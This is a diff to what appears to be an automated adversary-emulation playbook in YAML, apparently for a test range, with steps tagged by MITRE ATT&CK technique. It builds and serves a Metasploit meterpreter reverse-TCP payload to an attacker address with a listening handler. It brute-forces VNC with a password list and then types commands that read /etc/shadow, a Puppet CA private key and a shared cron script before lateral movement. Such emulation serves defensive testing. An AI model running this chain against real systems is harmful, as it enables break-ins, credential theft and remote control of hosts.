@@ -5,9 +5,8 @@
 ####################
 
 vars:
-  $SERVER_ADDRESS: 192.42.0.254
+  $SERVER_ADDRESS: fw.attackbed.com
   $ATTACKER_ADDRESS: 192.42.1.174
-  $DNS_SERVER: 192.42.0.233
   $LISTA:
   - "password1"
   - "password2"
@@ -19,6 +18,35 @@ vars:
   - "12345678"
  
 commands:
+### PREPARE THE REVERSE SHELL FOR THE LINUXSHARE
+  - type: mktemp
+    cmd: file
+    variable: RSHELL
+
+  - type: msf-payload
+    cmd: cmd/unix/python/meterpreter/reverse_tcp
+    payload_options:
+      LHOST: $ATTACKER_ADDRESS
+      LPORT: "4444"
+    local_path: $RSHELL
+
+  - type: msf-module
+    creates_session: movement
+    cmd: exploit/multi/handler
+    payload: "cmd/unix/python/meterpreter/reverse_tcp"
+    payload_options:
+      LHOST: $ATTACKER_ADDRESS
+      LPORT: "4444"
+    background: true
+    kill_on_exit: true
+
+  - type: webserv
+    local_path: $RSHELL
+    port: 8888
+    background: True
+    kill_on_exit: true
+
+### BRUTEFORCE VNC
   - type: loop
     break_if: $RESULT_STDOUT =~ vnc_connected
     cmd: "items(LISTA)"
@@ -88,6 +116,87 @@ commands:
   - type: sleep
     seconds: 2
 
+#id 
+  - type: vnc
+    session: foothold
+    cmd: type
+    input: "id"
+
+  - type: sleep
+    seconds: 3
+
+  - type: vnc
+    session: foothold
+    cmd: key
+    key: "enter"
+
+  - type: sleep
+    seconds: 2
+
+#cat etc/shadow 
+  - type: vnc
+    session: foothold
+    cmd: type
+    input: "cat /etc/shadow"
+
+  - type: sleep
+    seconds: 3
+
+  - type: vnc
+    session: foothold
+    cmd: key
+    key: "enter"
+    metadata:
+      techniques: "T1003.008"
+      tactics: "Credential Access"
+      technique_name: "OS Credential Dumping: /etc/passwd and /etc/shadow"
+
+  - type: sleep
+    seconds: 2 
+
+#cat certificates
+  - type: vnc
+    session: foothold
+    cmd: type
+    input: "cat /etc/puppetlabs/puppetserver/ca/ca_key.pem"
+
+  - type: sleep
+    seconds: 3
+
+  - type: vnc
+    session: foothold
+    cmd: key
+    key: "enter"
+    metadata:
+      techniques: "T1213"
+      tactics: "Collection"
+      technique_name: "Data from Information Repositories"
+
+  - type: sleep
+    seconds: 2 
+
+#cat healthcheck cron
+  - type: vnc
+    session: foothold
+    cmd: type
+    input: "cat /media/share/healthcheck_cron.sh"
+
+  - type: sleep
+    seconds: 3
+
+  - type: vnc
+    session: foothold
+    cmd: key
+    key: "enter"
+    metadata:
+      techniques: "T1039"
+      tactics: "Collection"
+      technique_name: "Data from Network Shared Drive"
+
+  - type: sleep
+    seconds: 2 
+
+#  HERE THE LATERAL MOVEMENT TAKES PLACE
   - type: vnc
     session: foothold
     cmd: type
@@ -108,33 +217,6 @@ commands:
   - type: sleep
     seconds: 1
 
-  - type: mktemp
-    cmd: file
-    variable: RSHELL
-
-  - type: msf-payload
-    cmd: cmd/unix/python/meterpreter/reverse_tcp
-    payload_options:
-      LHOST: $ATTACKER_ADDRESS
-      LPORT: "4444"
-    local_path: $RSHELL
-
-  - type: msf-module
-    creates_session: movement
-    cmd: exploit/multi/handler
-    payload: "cmd/unix/python/meterpreter/reverse_tcp"
-    payload_options:
-      LHOST: $ATTACKER_ADDRESS
-      LPORT: "4444"
-    background: true
-    kill_on_exit: true
-
-  - type: webserv
-    local_path: $RSHELL
-    port: 8888
-    background: True
-    kill_on_exit: true
-
   - type: vnc
     cmd: close
     session: foothold
@@ -142,6 +224,9 @@ commands:
       techniques: "T1021.005"
       tactics: "Lateral Movement"
       technique_name: "Remote Services: VNC"
+
+
+
 
 #################### MOVED ############################################
   - type: msf-session
